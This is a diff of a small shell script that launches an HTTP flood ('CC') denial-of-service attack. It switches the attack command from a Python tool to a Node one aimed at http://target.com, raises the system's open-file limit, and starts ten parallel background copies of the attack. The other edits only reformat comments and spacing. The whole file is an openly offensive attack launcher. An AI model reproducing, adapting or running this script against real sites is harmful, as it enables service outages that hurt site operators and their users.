@@ -5,17 +5,17 @@
 #  And change the process number
 #  Lastly run this script
 #
-#the command you want to exec
-atk_cmd="python3 cc.py -url http://target.com -v 4 -s 60"
+# the command you want to exec
+atk_cmd="node cc.js -url http://target.com -v 4 -s 60"
 
-#number of process that you want
+# number of processes that you want
 process=10
 
-#change the system limit
+# change the system limit
 ulimit -n 999999
 
 echo Attack started
-for ((i=1;i<=$process;i++))
+for ((i=1; i<=$process; i++))
 do
   $atk_cmd >/dev/null &
   sleep 0.1
